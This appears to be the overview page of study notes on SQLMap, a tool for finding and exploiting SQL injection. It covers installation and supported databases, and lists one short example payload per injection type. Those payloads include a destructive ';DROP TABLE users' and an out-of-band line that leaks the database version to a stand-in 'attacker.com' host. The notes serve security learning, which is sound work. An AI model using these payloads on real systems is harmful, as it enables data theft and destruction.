# SQLMap Overview
--------

- SQLMap is a common tool that is used for automating the process of detecting and exploiting SQL Injection vulnerabilities.

- Installation
```bash
sudo apt install sqlmap
```

- Confirm the installation
```bash
python sqlmap.py
```

## Supported Databases
SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

![image](https://github.com/user-attachments/assets/1dc59c09-bb5c-40a7-b65b-170cf47ca823)

## Supported SQL Injection Types
- SQLMap supports the following types of SQL Injection:
	- B: Boolean-based blind `AND 1=1`
	- E: Error-based `AND GTID_SUBSET(@@version,0)`
	- U: Union query-based `UNION ALL SELECT 1, @@version,3`
	- S: Stacked queries `;DROP TABLE users`
	- T: Time-based blind `AND 1=IF(2>1,SLEEP(5),0)`
	- Q: Inline queries `SELECT (SELECT @@version) from`
	- Out-of-band SQL Injection `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\README.txt'))`

# Table of Content
-----
- [Running SQLMap on an HTTP Request](Running%20SQLMap%20on%20an%20HTTP%20Request.md)
- [Handling SQLMap Errors](Handling%20SQLMap%20Errors.md)
- [Attack Tuning](Attack%20Tuning.md)
- [SQLMap Enumeration](SQLMap%20Enumeration.md)
- [Bypass Web Application Protections](Bypass%20Web%20Application%20Protection.md)
- [OS Exploitation](OS%20Exploitation.md)
